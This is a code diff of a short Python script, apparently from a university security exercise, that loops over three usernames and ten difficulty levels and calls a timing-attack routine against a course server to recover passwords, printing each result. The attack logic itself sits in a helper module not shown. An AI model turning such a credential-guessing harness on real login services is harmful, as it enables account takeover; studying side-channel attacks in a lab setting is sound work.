@@ -1,16 +1,26 @@
 import sys
 import Utils
 
+levels = [i for i in range(10)]
+users = ['adirbir', 'avivams', 'curiey']
 
-if len(sys.argv) == 3:
+for lvl in levels:
+    for usr in users:
+# if len(sys.argv) == 3:
+#
+#     difficulty = sys.argv[2]
+#     username = sys.argv[1]
+        try:
+            difficulty = lvl
+            username = usr
 
-    difficulty = sys.argv[2]
-    username = sys.argv[1]
+            start_url = f"http://aoi.ise.bgu.ac.il/?user={username}&password="
+            end_url = f"&difficulty={difficulty}"
 
-    start_url = f"http://aoi.ise.bgu.ac.il/?user={username}&password="
-    end_url = f"&difficulty={difficulty}"
+            password = Utils.timing_attack(start_url=start_url, end_url=end_url)
 
-    password = Utils.timing_attack(start_url=start_url, end_url=end_url)
+            if password:
+                print(f"[main][{usr}][{lvl}]: {password}")
 
-    if password:
-        print(password)
+        except Exception as e:
+            print(e)
